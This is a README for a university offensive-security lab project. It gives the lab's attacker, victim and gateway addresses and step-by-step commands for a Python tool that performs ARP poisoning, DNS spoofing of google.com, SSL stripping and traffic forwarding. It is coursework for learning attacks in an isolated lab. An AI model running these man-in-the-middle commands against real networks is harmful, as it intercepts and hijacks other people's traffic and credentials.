# 2IC80Project
Lab on Offensive Computer Security
"
### Addresses:
Attacker:
10.0.123.4  08:00:27:4f:6a:5d

Victim:
10.0.123.5  08:00:27:23:55:6e

Gateway:
10.0.123.1  52:54:00:12:35:00

### Commands:

See ARP table: `arp`
Clear ARP table: `sudo ip -s -s neigh flush all`

# Run steps separately:
1. ARP poison the victim: 
`sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "10.0.123.5" --macVictim "08:00:27:23:55:6e" --ipToSpoof "10.0.123.1"`

2. ARP poison the gateway: 
`sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "10.0.123.1" --ipToSpoof "10.0.123.5"`

3. DNS Spoof the victim: `sudo python3 main.py --interface "enp0s10" dnsSpoof --ipVictim "10.0.123.5" --siteToSpoof "google.com"` 

4. SSL Strip the victim: `sudo python3 main.py --interface "enp0s10" sslStrip --ipVictim "10.0.123.5" --siteToSpoof "google.com"` 

### For the forwarder to work we must first terminate the webserver that is running by default on the attacker machine.
### 1. Determine the PID of the process: sudo lsof -i :80
### 2. Kill the process: sudo kill -9 <PID>
5. Forward `sudo python3 main.py --interface "enp0s10" forward --ipVictim "10.0.123.5" --siteToSpoof "google.com"`
